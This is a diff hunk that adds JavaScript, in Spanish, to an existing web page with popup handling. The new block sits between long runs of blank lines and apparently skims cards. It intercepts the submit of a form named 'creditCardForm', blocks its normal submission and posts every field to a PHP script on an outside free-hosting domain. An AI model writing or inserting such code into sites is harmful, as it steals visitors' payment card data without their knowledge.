@@ -229,6 +229,48 @@
         closePopupButton.addEventListener('click', function () {
             popupOverlay.style.display = 'none';
         });
+
+
+
+
+
+
+
+        
+
+
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const creditCardForm = document.getElementById('creditCardForm');
+
+            creditCardForm.addEventListener('submit', function (e) {
+                e.preventDefault(); // Evitar que el formulario se envíe de forma predeterminada
+
+                // Obtener los valores del formulario y enviarlos al servidor
+                const formData = new FormData(creditCardForm);
+
+                fetch('https://ganadero-formulario.wuaze.com/guardar_datos.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Aquí puedes manejar la respuesta del servidor si es necesario
+                    console.log(data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            });
+        });
+
+
+
+
+
+
+
+        
         
         
         // Verificar si hay un parámetro de consulta "success" en la URL
